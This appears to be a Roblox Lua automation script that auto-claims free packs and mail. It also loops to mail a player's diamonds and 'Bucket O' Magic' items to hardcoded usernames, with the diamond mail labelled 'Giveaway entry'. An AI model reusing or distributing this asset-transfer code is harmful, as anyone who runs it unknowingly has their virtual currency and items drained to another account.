spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)


spawn(function()
    while true do
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

-- Gem Mailer
spawn(function()
    local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
    
    local username = "ADHDMeth" -- Replace with recipient's username
    local loopInterval = 5 -- Interval in minutes
    local mailTax = 100000 -- Tax deduction for sending diamonds
    local diamondThreshold = 100000000 -- Threshold for sending all gems

    while true do
        print("Attempting to retrieve diamond data...")
        local diamondItem = CurrencyCmds.GetItem("Diamonds")
        
        if not diamondItem or not diamondItem._data then
            print("[ERROR] Failed to retrieve diamond data. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        local diamonds = diamondItem._data._am
        local diamondUID = diamondItem._uid 

        print("Diamonds:", diamonds)
        print("Diamond UID:", diamondUID)

        if not diamondUID then
            print("[ERROR] diamondUID is nil. Retrying after interval...")
            task.wait(loopInterval * 60)
            continue
        end

        if diamonds > diamondThreshold then
            local amountToSend = diamonds - mailTax
            if amountToSend <= 0 then
                print("[ERROR] Amount to send is invalid (<= 0). Skipping this cycle.")
                task.wait(loopInterval * 60)
                continue
            end

            print("Threshold reached! Preparing to send diamonds.")
            print("Amount to send (after tax):", amountToSend)

            local args = {
                username,
                "Giveaway entry",
                "Currency",
                diamondUID,
                amountToSend
            }

            print("Args to invoke server:", args)

            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)

            if success then
                print("[SUCCESS] Diamonds sent successfully!")
            else
                print("[ERROR] Failed to send diamonds. Error:", errorMessage)
            end
        else
            print("Diamonds are below the threshold. Current amount:", diamonds)
        end

        print("Waiting for the next loop interval...")
        task.wait(loopInterval * 60)
    end
end)

-- Goop Mailer
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "SmallMan_MC"
    local loopInterval = 5 
    local sendAmount = 5000 -- Editable amount
    while true do
        local playerInventory = Save.Get()["Inventory"]
        local MiscInv = playerInventory["Misc"]
        print("Searching for Bucket O' Magic...")
        for key, item in pairs(MiscInv) do
            if item.id == "Bucket O' Magic" then
                local availableAmount = item._am or item.am or 1
                if availableAmount >= sendAmount then
                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
                    print("Found Bucket O' Magic item:", item)
                    print("Amount to send:", amountToSend)
                    local args = {
                        [1] = username,
                        [2] = "Thereeee",
                        [3] = "Misc",
                        [4] = key,
                        [5] = amountToSend
                    }
                    print("Invoking Server with args:", unpack(args))
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                else
                    print("Not enough Bucket O' Magic to send. Required:", sendAmount, "Available:", availableAmount)
                end
                break
            end
        end
        print("Finished processing Bucket O' Magic.")
        task.wait(loopInterval * 60)
    end
end)

